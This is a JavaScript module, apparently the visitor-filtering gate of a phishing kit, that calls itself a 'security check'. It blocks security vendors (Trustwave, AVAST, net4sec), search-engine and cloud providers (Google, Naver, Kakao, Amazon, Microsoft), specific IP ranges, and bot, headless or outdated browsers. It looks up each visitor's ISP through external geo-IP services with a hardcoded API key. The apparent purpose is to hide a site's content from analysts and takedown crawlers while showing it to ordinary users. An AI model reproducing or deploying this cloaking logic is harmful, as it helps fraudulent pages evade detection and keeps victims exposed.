var axios = require("axios");

// Define function to extract IPv4
exports.extractIPv4 = function (rawIp) {
  var ipv4Part = rawIp.match(/::ffff:(\d+\.\d+\.\d+\.\d+)/);
  if (ipv4Part) {
    return ipv4Part[1]; // Return the IPv4 part
  }
  return rawIp; // Return the original if it's not an IPv4-mapped IPv6 address
};

// Function to filter IPs
function ipFilter(data) {
  var resolve = data.resolve;
  var reject = data.reject;
  var userIP = data.userIP;

  var analyzeIpList = [
    585228769, 599777761, 679313377, 919593441, 1089060833, 1113984993,
    1123639265, 1239540193, 1373757921, 1424089569, -1401953823, -1379066911,
    -1376398879, -1176378911, -1126047263, -799543327,
  ];
  var naverIpPrefix = [
    "220.230.168.",
    "211.249.40.",
    "211.249.68.",
    "35.243.23.",
    "1.225.35.",
    "104.222.43.",
  ];

  var bResult = false;
  var targetIp = userIP;

  var intTargetIp = ipToLong(targetIp);
  for (var i = 0; i < analyzeIpList.length; i++) {
    if (intTargetIp === analyzeIpList[i]) {
      bResult = true;
      reject("IP Filter");
      return false;
    }
  }

  for (var j = 0; j < naverIpPrefix.length; j++) {
    if (targetIp.includes(naverIpPrefix[j])) {
      bResult = true;
      break;
    }
  }

  if (bResult) {
    reject("IP Filter");
    return false;
  }
  return true;
}

// Function to convert IP address to long integer
function ipToLong(ip) {
  var parts = ip.split(".");
  return parts.reduce(function (acc, part) {
    return (acc << 8) + parseInt(part, 10);
  }, 0) >>> 0;
}

// Function to get country and ISP information
function getCountryAndISP(data) {
  var userIP = data.userIP;

  return new Promise(function (resolve, reject) {
    if (userIP.startsWith("127")) {
      resolve(null);
      return;
    }

    axios
      .get("http://extreme-ip-lookup.com/json/" + userIP + "?key=nOaZbY9mHVAfAZ8yeAcC")
      .then(function (r) {
        var geoInfo = r.data;
        resolve({
          country: geoInfo.country,
          isp: geoInfo.isp,
        });
      })
      .catch(function (error) {
        console.error(["[getCountryAndISP]", error]);
        axios
          .get("http://ip-api.com/json/" + userIP + "?fields=country,isp&lang=en")
          .then(function (r) {
            var userInfo = r.data;
            resolve({
              country: userInfo["country"],
              isp: userInfo["isp"],
            });
          })
          .catch(function (error) {
            console.error(["[getCountryAndISP]", error]);
            resolve(null);
          });
      });
  });
}

// Array of blocked ISPs
var BLOCK_ISPS = [
  "google",
  "RIPE Network Coordination Centre",
  "naver",
  "daum",
  "kakao",
  "Microsoft Corporation",
  "Trustwave",
  "AVAST",
  "net4sec",
  "ColoUp",
  "iCloud Private Relay",
  "Amazon",
  "iCloud",
//   "QuadraNet",
  "Russia Red Byte LLC",
  "Baidu",
//   "24 Shells"
];

// Function to check IP information
function checkIpInfos(data) {
  var isp = data.isp;
  var reject = data.reject;
  console.debug('[isp]', isp);
  if (isp) {
    for (var i = 0; i < BLOCK_ISPS.length; i++) {
      if (isp.includes(BLOCK_ISPS[i])) {
        reject("Blocked ISP");
        return false;
      }
    }
  }
  return true;
}

// Function to check the browser
function checkBrowser(data) {
  var reject = data.reject;
  var userAgent = data.userAgent;

  var badKeys = [
    "bot",
    "python",
    "carbon",
    "github",
    "HeadlessChrome",
    "APIs-Google",
    "Mediapartners-Google",
    "Googlebot",
    "AdsBot",
    "FeedFetcher-Google",
    "crawlers",
    "DuplexWeb-Google",
    "Storebot-Google",
    "naver.me",
  ];
  var reason = "";
  var userAgentStr = userAgent || "";

  if (userAgentStr.includes("Chrome/")) {
    var chromeVersionMatch = userAgentStr.match(/Chrome\/(\d+)/);
    if (chromeVersionMatch) {
      var chromeVersion = parseInt(chromeVersionMatch[1], 10);
      if (chromeVersion < 85) {
        reject("Old browser, Chrome version < 85");
        return false;
      } else if (chromeVersion < 97) {
        var safariMatch = userAgentStr.match(
          /\s+Chrome\/[0-9.]*\s*(Safari\/[0-9.]*)?$/
        );
        if (safariMatch) {
          reject("Old Chrome browser, version < 97");
          return false;
        }
      }
    }
  } else if (userAgentStr.toLowerCase().includes("firefox")) {
    var firefoxVersionMatch = userAgentStr.match(/Firefox\/(\d+)/);
    if (firefoxVersionMatch) {
      var firefoxVersion = parseInt(firefoxVersionMatch[1], 10);
      if (firefoxVersion < 80) {
        reject("Old Firefox browser, version < 80");
        return false;
      }
    }
  }

  for (var i = 0; i < badKeys.length; i++) {
    if (userAgentStr.includes(badKeys[i])) {
      reject("Bad User-Agent, includes bad key: " + badKeys[i]);
      return false;
    }
  }

  return true;
}

// Function to find Google IP
function findGoogleIP(data) {
  var userIP = data.userIP;
  var reject = data.reject;

  if (userIP.startsWith("66.") || userIP.startsWith("74.")) {
    reject("Google IP");
    return false;
  }

  return true;
}

// Function to check security
function checkSecurity(data) {
  return (
    ipFilter(data) &&
    findGoogleIP(data) &&
    checkBrowser(data) &&
    checkIpInfos(data)
  );
}

// Function to run security check
exports.runSecurityCheck = function (data) {
  var userIP = data.userIP;
  var userAgent = data.userAgent;

  return new Promise(function (resolve, reject) {
    console.debug("[runSecurityCheck]", userIP);
    getCountryAndISP({ userIP: userIP, resolve: resolve, reject: reject }).then(function (rlt) {
      if (rlt) {
        var country = rlt.country;
        var isp = rlt.isp;
        console.debug("[country, isp]", country, isp);
        if (checkSecurity({ country: country, isp: isp, userIP: userIP, userAgent: userAgent, resolve: resolve, reject: reject })) {
          resolve("ok");
          return;
        }
      }
      reject("not ip available");
    }).catch(function (error) {
      console.log(error);
      reject(error);
    });
  });
};
